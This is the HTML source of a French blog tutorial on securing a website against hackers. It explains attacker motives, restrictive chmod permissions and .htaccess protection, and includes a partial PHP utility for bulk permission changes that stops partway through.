<!DOCTYPE HTML>
<!--
	Twenty by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html lang="fr">
<head>
<meta charset="utf-8">
<title>Sécuriser et protéger son site web des attaques des pirates</title>
<link rel="alternate" type="application/rss+xml" href="https://silomia.github.io/rss.xml" title="Silomia">
<link rel="alternate" type="application/rss+xml" href="https://silomia.github.io/en-rss.xml" title="Silomia English">
<link rel="alternate" hreflang="fr" href="https://silomia.github.io/internet-se-proteger-des-pirates-et-hackers.html">
<link rel="alternate" hreflang="en" href="https://silomia.github.io/en-internet-secure-protect-from-hacker-attacks.html">
<link rel="canonical" href="https://silomia.gitlab.io/internet-se-proteger-des-pirates-et-hackers.html">
<link rel="preload" href="css/styles.min.css" as="style">
<link rel="preload" href="js/script.min.js" as="script">
<link rel="preload" href="fonts/silomia-inter-light.woff2" as="font" type="font/woff2" crossorigin="anonymous">
<link rel="preload" href="fonts/silomia-inter-menu.woff2" as="font" type="font/woff2" crossorigin="anonymous">
<link rel="preload" href="fonts/silomia-inter-semibold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
<link rel="preload" href="fonts/silomia-symbol.woff2" as="font" type="font/woff2" crossorigin="anonymous">
<link rel="apple-touch-icon" sizes="192x192" href="favicon-touch-192x192.png">
<link rel="icon" type="image/png" sizes="144x144" href="favicon.png">
<link rel="manifest" href="manifest.json">
<link rel="mask-icon" href="magnolia-silomia-carre.svg" color="#ab2bab">
<meta name="apple-mobile-web-app-title" content="Silomia">
<meta name="application-name" content="Silomia">
<meta name="theme-color" content="#ffffff">
<meta property="og:title" content="Sécuriser et protéger son site web des attaques des pirates">
<meta property="og:locale" content="fr">
<meta property="og:site_name" content="Silomia">
<meta property="og:type" content="article">
<meta property="og:image" content="https://silomia.github.io/images/password-pn_photo.jpg">
<meta property="og:url" content="https://silomia.github.io/internet-se-proteger-des-pirates-et-hackers.html">
<meta name="viewport" content="width=device-width initial-scale=1.0 maximum-scale=1.0 user-scalable=no">
<script type="application/ld+json">
	{"@context":"http://schema.org/","@type":"Article","author":{"@type":"Person","name":"Ralph Davidovits"},"publisher":{"@type":"Organization","name":"Silomia","logo":{"@type":"ImageObject","url": "https://silomia.github.io/favicon-touch-192x192.png"}},
	"datePublished":"2021-06-21","dateModified":"2022-09-10",
	"headline":"Sécuriser et protéger son site web des attaques des pirates",
	"image":["https://silomia.github.io/images/up-close-pear-cake.jpg"],
	"mainEntityOfPage":{"@type":"WebPage","@id":"https://silomia.github.io/internet.html"}
	}
</script>
<style media="screen">@media screen and (prefers-color-scheme:dark){body{color:silver;background-color:#151515}}html,body,div,span,h1,h2,h3,h4,p,a,em,img,picture,strong,ul,li,article,footer,header,section{margin:0;padding:0;border:0}article,footer,header,section{display:block}*,::before,::after{box-sizing:border-box}.container{margin-left:auto;margin-right:auto;width:1300px}.row{border-bottom:solid 1px transparent;box-sizing:border-box;margin:-50px 0 -1px -50px}.row>*{float:left;box-sizing:border-box;padding:50px 0 0 50px}.row::after,.row::before{content:'';display:block;clear:both;height:0}.\34 u,.\34 u\${width:33.3333333333%;clear:none;margin-left:0}.\36 u{width:50%;clear:none;margin-left:0}.row.\31 50\%>*{padding:75px 0 0 75px}.row.\31 50\%{margin:-75px 0 -1px -75px}.\38 u{width:66.6666666667%;clear:none;margin-left:0}body{font-family:'Inter',-apple-system,system-ui,sans-serif;font-size:14pt;font-weight:300;letter-spacing:.02em;line-height:1.65em}a{text-decoration:none;border-bottom:dotted 1px}strong{font-weight:600}em{font-style:italic}p,blockquote,ul{margin:0 0 2em 0}h1,h2,h3,h4{color:inherit;font-weight:600;line-height:1.75em;margin:.7em 0;text-transform:uppercase;letter-spacing:normal}h1{font-size:1.4em}h2,h3{font-size:1.15em}blockquote{font-style:italic;padding:1em 0 1em 2em}section{font-size:14pt}section.special{text-align:center}header.major{padding-bottom:2em}header.special{margin-bottom:4em;padding-top:5.5em;position:relative;text-align:center}header.special::before,header.special::after{border-bottom:solid 1.5px;border-top:solid 1.5px;content:'';height:7px;opacity:.1;position:absolute;top:1.75em;width:43%}header.special::before{left:0}header.special::after{right:0}header.special h1{margin-bottom:0;font-weight:300}header.special h1+p{margin-bottom:0;padding-top:1.5em}header.special .icon{height:7em;left:0;position:absolute;text-align:center;top:1em;width:100%}header.special .icon::before{font-size:3.5em;opacity:.35}footer>:last-child{margin-bottom:0}picture{min-height:100px}#main{padding:7em 0}body.index #main{padding-top:5em}.mh-head .mh-text{display:block}.mh-head.mh-align-right .mh-text{text-align:right}.image.featured img,picture.image.featured{display:block;margin:0 0 2em 0;width:100%;min-height:200px}.wrapper{margin-bottom:5em;padding:5em}.wrapper.style3,.wrapper.style4{color:inherit;border-radius:5px}.wrapper.style4{padding:4em}.fa-lg{font-size:1.33333333em;line-height:.75em;vertical-align:-15%}.icon{text-decoration:none;position:relative}.icon::before{font-style:normal;font-weight:400;text-transform:none!important}.mm-menu_offcanvas:not(.mm-menu_opened){display:none}@media screen and (min-width:1900px){.container{width:1400px}body,section{font-size:16pt}}@media screen and (max-width:1680px){.container{width:1200px}.row>*{padding:40px 0 0 40px}.row{margin:-40px 0 -1px -40px}.row.\31 50\%>*{padding:60px 0 0 60px}.row.\31 50\%{margin:-60px 0 -1px -60px}#main .sidebar section{margin:3em 0 0;padding:3em 0 0}#main .sidebar section:first-child{border-top-width:0;padding-top:0;margin-top:0}body{font-size:14pt}section{font-size:12.5pt}}@media screen and (max-width:1280px){.container{width:960px}.row>*{padding:40px 0 0 40px}.row{margin:-40px 0 -1px -40px}.row.\31 50\%>*{padding:60px 0 0 60px}.row.\31 50\%{margin:-60px 0 -1px -60px}#main .sidebar section{margin:3em 0 0 0;padding:3em 0 0 0}#main .sidebar section:first-child{border-top-width:0;padding-top:0;margin-top:0}body{font-size:13pt;line-height:1.65em}section{font-size:12pt}h1,h2,h3,h4{line-height:1.5em}.wrapper{margin-bottom:4em;padding:4em 3em}.wrapper.style4{padding:3em}}@media screen and (max-width:980px){.container{width:95%}.row>*{padding:30px 0 0 30px}.row{margin:-30px 0 -1px -30px}.row.\31 50\%>*{padding:45px 0 0 45px}.row.\31 50\%{margin:-45px 0 -1px -45px}body{font-size:13pt;line-height:1.55em}section{font-size:12.5pt}header.special{padding-left:2.5em;padding-right:2.5em}.wrapper{margin-bottom:3em;padding:3em 2.5em}.wrapper.style4{padding:2.5em}}@media screen and (max-width:840px){.container{width:95%!important}.row>*{padding:30px 0 0 30px}.row{margin:-30px 0 -1px -30px}.row.\31 50\%>*{padding:45px 0 0 45px}.row.\31 50\%{margin:-45px 0 -1px -45px}.\31 2u\28narrower\29{width:100%;clear:none;margin-left:0}html,body{font-size:14pt}section{font-size:13pt}h1{font-size:1.25em;letter-spacing:-.02em}h2,h3{font-size:1.05em;letter-spacing:.002em}header.special{margin-bottom:4em;padding-top:5em}header.special::before,header.special::after{width:40%}header.special h1+p{padding-top:1.25em;letter-spacing:-.01em}section{margin:1em 0}section:first-child{margin-top:0}.wrapper.style4{padding-bottom:3em}#main{padding:5em 0}}@media screen and (max-width:730px){.container{width:100%!important}.row>*{padding:30px 0 0 30px}.row{margin:-30px 0 -1px -30px}.row.\31 50\%>*{padding:45px 0 0 45px}.row.\31 50\%{margin:-45px 0 -1px -45px}body{min-width:320px;font-size:14pt;letter-spacing:.01em}section{font-size:13.5pt}h1{font-size:1.25em}h2,h3{font-size:1em}header{text-align:center}header.special{margin-bottom:3em;padding-left:1.5em;padding-right:1.5em}header.special::before,header.special::after{width:38%}header.special .icon{font-size:.75em;top:1.5em}header p{text-align:center}.image.featured img,picture.image.featured{min-height:100px}.wrapper{margin-bottom:2.5em;padding:2.25em 1.5em}.wrapper.style4{background-size:10em;padding:1.5em 1.5em 3em 1.5em}#main{padding:3.5em 0 2.5em 0}}@media screen and (max-width:360px){body{font-size:14pt}section{font-size:13pt}}</style>
</head>

<body class="right-sidebar" onerror="ers()">
<div id="page-wrapper">

<!-- Header -->
<header id="header" role="banner" class="mh-head mh-align-right">
	<span class="mh-btns-left"><a class="mburger mburger--squeeze" href="#my-menu"><b></b> <b></b> <b></b> <span class="mburger-label">Menu</span></a></span>
	<span class="icon fa-magnolia mh-logo"></span>
	<span class="mh-text slogan">Par le chemin des mots, <strong> toucher la lumière.</strong></span>
</header>

<!-- Main -->
<article id="main">
	<header class="special container">
		<span class="icon fa-code"></span>
		<h1>Sécuriser et protéger son site web des <strong>attaques des pirates et hackers</strong></h1>
		<p>Sachez comment ils procèdent pour ne pas en avoir peur et connaitre la parade.</p>
	</header>

	<!-- One -->
	<section class="wrapper style4 container">
		<div class="row 150%">
			<div class="8u 12u(narrower)">

				<!-- Content -->
				<div class="content">
					<section>
						<picture class="image featured">
							<source type="image/avif" media="(max-width: 415px)" srcset="images/password-pn_photo@1x.avif">
							<source type="image/avif" media="(min-width: 416px)" srcset="images/password-pn_photo@1x.avif 1x, images/password-pn_photo.avif 2x">
							<source media="(max-width: 415px)" srcset="images/password-pn_photo@1x.jpg">
							<source media="(min-width: 416px)" srcset="images/password-pn_photo@1x.jpg 1x, images/password-pn_photo.jpg 2x">
							<img src="images/password-pn_photo@1x.jpg" alt="Password. Crédit photo: PN_Photo">
						</picture>
						<header>
							<h2>Table des matières</h2>
						</header>
						<p>
<table class="smallfont">
<tbody>
<tr>
<td><a href="#intro">Qui sont les pirates?</a></td>
<td><a href="#chmod">Les droits CHMOD</a></td>
<td><a href="#htaccess">Protection par htaccess</a></td>
</tr>
<tr>
<td><a href="#gesfic">Gestionnaire de fichiers</a></td>
<td><a href="#installsql">Installer un blog, cms, wiki</a></td>
<td><a href="#nommage">Nommage de fichiers</a></td>
</tr>
<tr>
<td><a href="#motpasse">Les mots de passe</a></td>
<td><a href="#cryptconfig">Crypter config.inc.php</a></td>
<td><a href="#cryptmail">Cryptez l'adresse e-mail</a></td>
</tr>
<tr>
<td><a href="#adressmail">Adresses e-mails à éviter</a></td>
<td><a href="#dossierpasse">Blocage par mot de passe</a></td>
<td><a href="#robots">Le fichier robots.txt</a></td>
</tr>
<tr>
<td><a href="#protcss">Protéger CSS et index.php</a></td>
<td><a href="#filtrephp">Sécuriser un script PHP</a></td>
<td><a href="#injectsql">Contrer l'injection SQL</a></td>
</tr>
<tr>
<td><a href="#fichmodif">Liste des fichiers modifiés</a></td>
<td><a href="#testweb">Tester la sécurité du site</a></td>
<td><a href="#piratesavoir">Piraté sans le savoir?</a></td>
<td> </td>
</tr>
</tbody>
</table></p>
						<a id="intro"></a><hr><br>
						<header>
							<h2>Introduction</h2>
						</header>
						<p>Comment éviter que votre site web ne soit utilisé par un pirate comme plateforme de phishing (hameçonnage) ou d'envoi massif de spams (pourriels)&nbsp;? Comment éviter le “defacing”, c'est-à-dire l'effacement de votre site web et son remplacement par un autre, ou une page avec un slogan anti-occidental&nbsp;? Comment éviter certains trous de sécurité&nbsp;?</p>
						<p>À priori, les serveurs mutualisés de votre hébergeur devraient être relativement sécurisés et disposer d'outils permettant de bloquer certains comportements suspects. Les hébergeurs sont des professionnels qui ont la maitrise de leurs outils. Ils mettent à votre disposition un espace que vous devez contrôler, ils ne le font pas pour vous. En effet, ils ne s'occupent que de leur partie (la gestion du matériel et de leurs serveurs), et vous êtes responsable des données que vous y mettez (site web, e-mail, fichiers…). Par conséquent, l'hébergeur suspend votre site web après une attaque, vous laissant le soin de corriger le problème tout seul. Tant que vous n'intervenez pas, cette action à postériori bloque votre compte et votre site web reste inaccessible. Il est donc préférable de prévenir le piratage pour l'empêcher de vous nuire.</p>
						<p>Voici donc quelques conseils concrets, pratiques et très efficaces. C'est l'accumulation de ces trucs et astuces qui sécurisera votre site, car il n'y a pas de solution unique&nbsp;; les pirates utilisent plusieurs moyens différents pour forcer un compte.</p>
						<p><strong>Qui sont les pirates&nbsp;?</strong> Les premiers sont des “skiddy”, des jeunes (“kid” en anglais, “kiddy” pour petit jeune) qui utilisent des scripts prêts à l'emploi (le “s” de skiddy) qu'on trouve facilement sur le web pour exploiter les failles d'un CMS, blog, e-commerce, etc. Ils ne font qu'utiliser ces scripts comme on utilise un logiciel. Ce ne sont pas des “petits génies”, ils ne programment pas et n'inventent rien. Ils se lancent des défis à celui qui effacera ou violera le plus de sites web. Les autres, bien plus dangereux, sont des pirates au service d'une mafia afin de prendre le contrôle de votre site web via une faille de votre CMS, blog ou e-commerce pour le convertir en plateforme d'envoi de spams ou de phishing, ou en automate pour violer d'autres ordinateurs. Ceux-là créent leurs propres scripts qu'ils ne partagent pas avec une communauté. Ils font cela pour l'argent&nbsp;; les mafieux les payent en fonction du nombre de sites web piratés, d'identifiants et mot de passe récoltés, de moyens de paiements interceptés, d'ordinateurs personnels dont ils ont pris le contrôle à l'insu du malheureux propriétaire (c'est-à-dire votre PC et chez vous en profitant de votre connexion à internet en programmant un <em>malware</em> par exemple).</p>
						<p><strong>Pourquoi attaquent-ils votre site&nbsp;?</strong> Ni le skiddy, ni le mafieux ne vous visent personnellement. Les uns le font pour le jeu, les autres pour l'argent. Il est peu probable qu'on vous vise personnellement. Certains skiddies effacent des sites et se cachent derrière des pseudo slogans politiques et anti-occidentaux, histoire de vous faire peur, de se donner de l'importance et se prendre au sérieux. Il n'en est rien.</p>
						<p><strong>Comment savent-ils que mon site a une faille de sécurité&nbsp;?</strong> Réponse&nbsp;: Google ou tout autre moteur de recherche&nbsp;! Il cherche un fichier précis comme login.php, confip.php ou autres, et, combiné avec quelques mots-clés, ils savent quel CMS, blog ou e-commerce vous utilisez. Ils essaieront alors de lancer un script pour tester si l'attaque fonctionne. Ils ne font même pas ça manuellement, car ils ont des logiciels qui le font automatiquement&nbsp;!!! Leurs logiciels testent chaque URL listée par Google à la recherche de la faille. C'est aussi simple que ça. Ils vous trouvent par hasard.</p>
						<p>Donc, nous allons essayer de nous prémunir contre ces attaques automatiques. Ces conseils ne concernent que les sites web utilisant un CMS, blog ou e-commerce, etc. programmés par des informaticiens ou par vous.</p>
						<p><strong class="vert">CONSEIL NUMÉRO 1&nbsp;:</strong> votre CMS, blog ou e-commerce doit être à jour. Vous suivrez les mises à jour de sécurité et les installerez sans attendre.</p>
						<p><strong class="vert">CONSEIL NUMÉRO 2&nbsp;: LES RÈGLES LES PLUS IMPORTANTES</strong> <br>
						Comme ce tutoriel est long, voici les règles qu'il faut appliquer en priorité. Vous pourrez inclure les autres plus tard.<br>
						<strong>1-</strong> Attribuez par FTP aux fichiers les droits chmod 404 et aux dossiers les droits chmod 505. <a href="#chmod">Voir l'article ci-dessous.</a> <strong>C'est, sans conteste, la règle la plus efficace et indispensable.</strong></p>
						<p><strong>2-</strong> Le tableau de bord ou l'interface d'administration de votre blog, CMS ou e-commerce est protégé par un identifiant et un mot de passe complexe. Toutefois, sa résistance à l'agression dépend des choix techniques (et des failles) du programmeur. Contre cela, ajoutez une deuxième protection par <a href="#dossierpasse">le mot de passe .htaccess.</a> Si un pirate arrive à contourner la première sécurité, il va se heurter à un deuxième mur. <strong>Cette double défense est une armure contre les attaques automatiques.</strong></p>
						<p><strong>3-</strong> Règles de filtrage par htaccess. Permet d'arrêter de nombreuses attaques avant de toucher votre site web. <a href="#htaccess">Voir l'article ici.</a> Leurs efficacités seront excellentes mais elles se basent sur <strong>les comportements des hackers et des techniques qui évoluent</strong> avec les années. Ces protections ne seront jamais absolues.</p>
						<p>Si vous pouvez combiner les trois premières règles, ou au minimum seulement les deux premières, <strong class="vert"> vous érigerez une véritable forteresse&nbsp;!</strong></p>
						<p><strong>4-</strong> Règles de sauvegarde et de restauration de votre site web. D'abord, vérifiez quels fichiers le pirate a ajouté ou modifié en installant <a href="#fichmodif">ce script </a>. Ensuite, êtes-vous capable d'effacer complètement votre site web pour supprimer toutes les traces du pirate et de tout réactiver en 30 minutes&nbsp;? Voici comment. <a href="internet-sauvegarde-backup-restauration-web-sql.html">Lire l'article ici</a>.</p>
						<a id="chmod"></a><hr><br>
						<header>
							<h2>Les droits d'écriture, de lecture et d'exécution.</h2>
						</header>
						<p><strong class="vert">-= INDISPENSABLE =-</strong></p>
						<p>Plus d'infos ici&nbsp;: <a href="https://fr.wikipedia.org/wiki/Chmod">Description du CHMOD et de la signification des numéros.</a></p>
						<p>Attention, ces règles peuvent fonctionner pour certains hébergeurs et pas chez d'autres. Faites un petit essai, cela en vaut vraiment la peine.</p>
						<p>On a l'habitude de dire qu'on doit attribuer par FTP les droits 644 à un fichier et 755 à un dossier.<br>
						En fait, certains hébergeurs (mais pas tous) ne semblent pas utiliser de <em>groupe</em>. Donc, on pourrait très bien utiliser les droits 604 pour un fichier et 705 pour un dossier. Si un pirate pénètre le système avec un droit de <em>groupe</em>, il n'aura accès à rien, ni en lecture ni en écriture.</p>
						<p>On peut aller plus loin. Protégeons les parties sensibles de votre CMS, blog ou e-commerce, comme le fichier config.php et .htaccess en lui donnant les droits 404 (ou 444). Personne ne pourra le modifier, même pas vous (c'est faux dans l'absolu si votre site a un gros trou de sécurité, mais imparable contre une attaque automatique). Vous ne pourrez le faire que par FTP quand vous aurez vraiment besoin de le modifier.</p>
						<p><strong>Voilà comment je protège mon site&nbsp;:</strong><br>
						Tous les fichiers ont les droits 404 (ou 444).<br>
						Tous les dossiers ont les droits 505 (ou 555).<br>
						Si un fichier ou un dossier nécessitent des droits d'écriture par le serveur mettez 604 pour le fichier et 705 pour le dossier. Inutile de faire le fameux 777 (tous les droits à tout le monde) qui est un danger public, une provocation au piratage, car vous annoncez que votre maison est grande ouverte, sans porte ni fenêtre, tout le monde peut se servir.<br>
						Les fichiers config et htaccess ont des droits 404 (ou 444)<br>
						Le dossier “www” ou “public_html” <strong>doit</strong> être en chmod 705 ou 755 selon votre hébergeur, ne le changez jamais.</p>
						<p><strong>Avantage&nbsp;:</strong> personne ne peut modifier vos fichiers. <strong>Inconvénient&nbsp;:</strong> il faut changer les droits en écriture (644 et 755) si vous faites une mise à jour de votre CMS, blog ou e-commerce et remettre les bons droits 404 (ou 444) et 505 (ou 555) après. Cela prend 10 min., mais ça en vaut la peine. Si votre hébergeur ne vous permet pas de faire cela, déménagez chez un autre.</p>
						<p><strong>Pourquoi est-ce si important&nbsp;?</strong> Le pirate essaye d'installer un fichier sur votre site afin d'en prendre le contrôle (pour effacer le site, y placer des fichiers pour faire du phishing ou un script qui envoie du spam, etc.). Il cherche des trous de sécurité pour pouvoir enregistrer son fichier de prise de contrôle dans votre serveur. Si votre site web a un trou de sécurité, le pirate l'exploitera, mais comme votre site web n'a que des dossiers et fichiers interdits en écriture, il ne pourra rien enregistrer. Son attaque ne marchera pas. <strong>S'il n'y avait qu'une seule règle à appliquer ce serait celle-là, sans conteste la plus efficace et indispensable.</strong></p>
						<p>Le plus simple est d'utiliser votre logiciel de FTP, d'afficher les informations relatives à un fichier ou un dossier et votre logiciel affiche l'option de modification des droits. Une autre méthode efficace, si vous avez de nombreux fichiers, est de se connecter en SSH (voir sa description plus bas). Sinon, voici un petit script PHP qui vous permettra de réaliser cette opération très simplement. Vous enregistrez ce fichier dans votre hébergement web, vous l'ouvrez depuis votre navigateur, entrez le chemin du dossier à traiter, et choisissez les réglages CHMOD pour tous les fichiers et dossiers inclus dans ce répertoire. Un rapport détaillé vous donnera les résultats. Une fois l'opération terminée, supprimez ce fichier pour éviter toute utilisation involontaire.</p>
						<p>Vous pouvez prendre ce fichier PHP ici&nbsp;: <a href="depot/chmod.zip">chmod.zip (2 Ko)</a></p>
<span class="smallfont">Code PHP&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #BC7A00">&lt;?php</span>
<span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">FORMULAIRE DE MODIFICATION DES DROITS CHMOD DES FICHIERS ET DOSSIERS</span>
<span style="color: #408080; font-style: italic">Enregistrez ce fichier dans votre répertoire hébergement web, ouvrez-le </span>
<span style="color: #408080; font-style: italic">avec votre navigateur et suivez les instructions.</span>
<span style="color: #408080; font-style: italic">Un rapport d&#39;erreur est fourni. Supprimez le fichier après utilisation.</span>
<span style="color: #408080; font-style: italic">*/</span>

<span style="color: #408080; font-style: italic">/* initialisation des variables */</span>
<span style="color: #19177C">$dosPerm</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;0&quot;</span>;
<span style="color: #19177C">$ficPerm</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;0&quot;</span>;
<span style="color: #19177C">$retval</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;0&quot;</span>; <span style="color: #408080; font-style: italic">/* nombre d&#39;erreurs CHMOD */</span>

<span style="color: #408080; font-style: italic">/* Chemin du dossier a traiter */</span>
    <span style="color: #19177C">$chem</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^_A-Za-z0-9-\.%\/]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;chemin&quot;</span>]);    <span style="color: #408080; font-style: italic">/* chemin de fichier absolu (avec nettoyage contre piratage) */</span>
    <span style="color: #19177C">$chem</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/\.\.\//&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$chem</span>);    <span style="color: #408080; font-style: italic">/* on interdit la commande ../ */</span>
    <span style="color: #008000">define</span>(<span style="color: #BA2121">&#39;ABSPATH&#39;</span>, <span style="color: #008000">dirname</span>(<span style="color: #008000; font-weight: bold">__FILE__</span>));
    <span style="color: #19177C">$chem</span> <span style="color: #666666">=</span> ABSPATH<span style="color: #666666">.</span><span style="color: #19177C">$chem</span>;    <span style="color: #408080; font-style: italic">/* chemin de fichier absolu de votre compte du genre /home/loginftp/www/ ou /home/loginftp/public_html/ etc. */</span>

<span style="color: #408080; font-style: italic">/* Droits des dossiers */</span>
    <span style="color: #19177C">$d1</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^57]/&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;dir1&quot;</span>]);
    <span style="color: #19177C">$d2</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^057]/&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;dir2&quot;</span>]);
    <span style="color: #19177C">$d3</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^057]/&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;dir3&quot;</span>]);
    <span style="color: #19177C">$dosPerm</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;0&quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$d1</span><span style="color: #666666">.</span><span style="color: #19177C">$d2</span><span style="color: #666666">.</span><span style="color: #19177C">$d3</span>;
    <span style="color: #19177C">$dosPerm</span> <span style="color: #666666">=</span> octdec(<span style="color: #19177C">$dosPerm</span>);
<span style="color: #408080; font-style: italic">/* Droits des fichiers */</span>
    <span style="color: #19177C">$f1</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^46]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;fic1&quot;</span>]);
    <span style="color: #19177C">$f2</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^046]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;fic2&quot;</span>]);
    <span style="color: #19177C">$f3</span> <span style="color: #666666">=</span> <span style="color: #008000">preg_replace</span>(<span style="color: #BA2121">&quot;/[^046]/i&quot;</span>,<span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #19177C">$_POST</span>[<span style="color: #BA2121">&quot;fic3&quot;</span>]);
    <span style="color: #19177C">$ficPerm</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;0&quot;</span><span style="color: #666666">.</span><span style="color: #19177C">$f1</span><span style="color: #666666">.</span><span style="color: #19177C">$f2</span><span style="color: #666666">.</span><span style="color: #19177C">$f3</span>;
    <span style="color: #19177C">$ficPerm</span> <span style="color: #666666">=</span> octdec(<span style="color: #19177C">$ficPerm</span>);

<span style="color: #408080; font-style: italic">/* Formulaire html pour changer les droits */</span>
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;html&gt;&lt;meta http-equiv=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">content-type</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> content=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">text/html; charset=utf-8</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> /&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;body&gt;&lt;h3&gt;Changer les droits d&#39;acc&amp;egrave;s CHMOD aux dossiers et fichiers &lt;br /&gt;dans votre h&amp;eacute;bergement.&lt;/h3&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;form method=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">post</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt;Droits des dossiers: &lt;/td&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;td&gt;&lt;select name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">dir1</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">5</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;5&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">7</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> selected&gt;7&lt;/option&gt;&lt;/select&gt;&lt;select name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">dir2</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">0</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;0&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">5</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> selected&gt;5&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">7</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;7&lt;/option&gt;&lt;/select&gt;&lt;select name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">dir3</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">0</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;0&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">5</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> selected&gt;5&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">7</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;7&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt;Droits des fichiers: &lt;/td&gt;&quot;</span>;
